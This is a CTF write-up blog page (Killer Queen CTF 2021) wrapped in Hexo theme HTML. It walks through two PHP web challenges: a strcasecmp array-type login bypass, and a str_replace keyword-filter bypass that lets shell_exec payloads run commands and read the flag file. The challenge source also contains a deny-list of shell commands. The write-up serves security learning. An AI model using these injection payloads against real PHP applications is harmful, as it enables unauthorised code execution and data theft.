@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="atx0mg">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="atx0mg">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="WebJust Not My TypeRead More →">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Killer Queen CTF 2021">
+<meta property="og:url" content="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/index.html">
+<meta property="og:site_name" content="atx0mg">
+<meta property="og:description" content="WebJust Not My TypeRead More →">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/7mPR9DM.jpg">
+<meta property="og:image" content="https://i.imgur.com/9jZMWng.jpg">
+<meta property="og:image" content="https://i.imgur.com/RnTTaaP.jpg">
+<meta property="og:image" content="https://i.imgur.com/btBqIgP.jpg">
+<meta property="og:image" content="https://i.imgur.com/fG7mUZo.jpg">
+<meta property="og:image" content="https://i.imgur.com/wLeoz2M.jpg">
+<meta property="og:image" content="https://i.imgur.com/7K9nO5Y.png">
+<meta property="og:image" content="https://i.imgur.com/Wf8JUSK.jpg">
+<meta property="og:image" content="https://i.imgur.com/TMPaf5Y.jpg">
+<meta property="og:image" content="https://i.imgur.com/S7TboLk.jpg">
+<meta property="og:image" content="https://i.imgur.com/NWY85w6.jpg">
+<meta property="og:image" content="https://i.imgur.com/k7s83OX.png">
+<meta property="article:published_time" content="2021-10-31T03:06:56.000Z">
+<meta property="article:modified_time" content="2025-04-10T03:37:48.563Z">
+<meta property="article:author" content="atx0mg">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/7mPR9DM.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/portfolio.ico">
+    
+    <title>Killer Queen CTF 2021 · atx0mg&#39;s Fortress</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>atx0mg's Fortress.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">atx0mg&#39;s Fortress.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Killer Queen CTF 2021</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                Killer Queen CTF 2021
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">668</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2021/10/31</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a><code>Just Not My Type</code></h3><p><img src="https://i.imgur.com/7mPR9DM.jpg"><br><a href="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/" target="_self">Read More →</a></p>
+<span id="more"></span>
+<ul>
+<li><p>Challenge Description &#x3D;&gt; Simple login page<br>  <img src="https://i.imgur.com/9jZMWng.jpg"></p>
+</li>
+<li><p>Source code:</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;I just don<span class="string">&#x27;t think we&#x27;</span>re compatible&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;shhhh you don&#x27;t get to see this locally&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$password</span>, <span class="variable">$FLAG</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;That&#x27;s the wrong password!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    Password</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>Vulnerability:</p>
+<ul>
+<li>Turned out that <code>strcasecmp</code> in php will return 0 (values are the same) thus bypassing the check point when the parameter is an array</li>
+<li>The reason is because <code>strcasecmp</code> cannot deal with arrays. If a user pass <code>password[]=123456</code>, it will return NULL. And the comparsion for <code>NULL</code> and <code>0</code> results in 0 (e.g. NULL &#x3D;&#x3D; 0 &#x3D;&#x3D;&gt; true)<br>  <img src="https://i.imgur.com/RnTTaaP.jpg"></li>
+</ul>
+</li>
+<li><p>BurpSuite to send the payload<br>  <img src="https://i.imgur.com/btBqIgP.jpg"></p>
+<ul>
+<li>We can even send variables without initializing values &#x3D;&gt; Just send <code>password[]</code><br>  <img src="https://i.imgur.com/fG7mUZo.jpg"></li>
+</ul>
+</li>
+<li><p>Got the flag: <code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p>
+<h2 id="Resources-for-first-challenge"><a href="#Resources-for-first-challenge" class="headerlink" title="Resources for first challenge:"></a>Resources for first challenge:</h2></li>
+<li><p><a target="_blank" rel="noopener" href="http://int03.blogspot.com/2012/10/csaw-2012-ctf-web-600-write-up.html">CSAW-2012-Web</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.chabug.org/ctf/417.html">PHP Vulnerable functions</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/a/8236390/12349124">NULL &#x3D;&#x3D; 0 return True in PHP</a></p>
+</li>
+</ul>
+<h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h3 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a><code>PHat Pottomed Girls</code></h3><ul>
+<li><p>Challenge Descriptions<br><img src="https://i.imgur.com/wLeoz2M.jpg"></p>
+</li>
+<li><p>Challenge Source code</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">15</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$originalstring</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;?php&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$originalstring</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fread&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fgets&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;strings&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;dd&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;cut&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;grep&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;awk&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;sed&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;read&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$notetoadd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;notewrite&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$newnote</span> = <span class="variable">$_POST</span>[<span class="string">&quot;notewrite&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3rd times the charm and I&#x27;ve learned my lesson. Now I&#x27;ll make sure to filter more than once :)</span></span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$newnote</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;notes&quot;</span>], <span class="string">&quot;<span class="subst">$filename</span>.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>.php&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>Challenge Entry<br><img src="https://i.imgur.com/7K9nO5Y.png"></p>
+</li>
+<li><p>Analysis &#x3D;&gt; find vulnerability at <code>str_replace()</code>:</p>
+<ul>
+<li>Although there exists filter to filter specifc command</li>
+<li>We can easily bypass <code>str_replace()</code> by reconstructing the string one by one word thus leads to command injections  (e.g. if <code>cat</code> is filtered for once, the if we construct a word <code>c</code>cat<code>a</code>cat<code>t</code>cat, when cat is filtered, <code>cat</code> will remain and we can utilize this vulnerability to construct our payload)</li>
+</ul>
+</li>
+<li><p>Payload:</p>
+<ul>
+<li><code>&lt;&lt;&lt;&lt;???? phpinfo(); ????&gt;&gt;&gt;&gt;</code></li>
+<li>Result:<br>  <img src="https://i.imgur.com/Wf8JUSK.jpg"></li>
+</ul>
+</li>
+<li><p>Payload:</p>
+<ul>
+<li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;whoami&#39;); ????&gt;&gt;&gt;&gt;</code></li>
+<li>Result:<br>  <img src="https://i.imgur.com/TMPaf5Y.jpg"></li>
+</ul>
+</li>
+<li><p>Payload:</p>
+<ul>
+<li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;ls -lart&#39;); ????&gt;&gt;&gt;&gt;</code></li>
+<li>Result:<br>  <img src="https://i.imgur.com/S7TboLk.jpg"></li>
+</ul>
+</li>
+<li><p>Payload:</p>
+<ul>
+<li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;ccccatatatat /fffflaglaglaglag.php&#39;); ????&gt;&gt;&gt;&gt;</code></li>
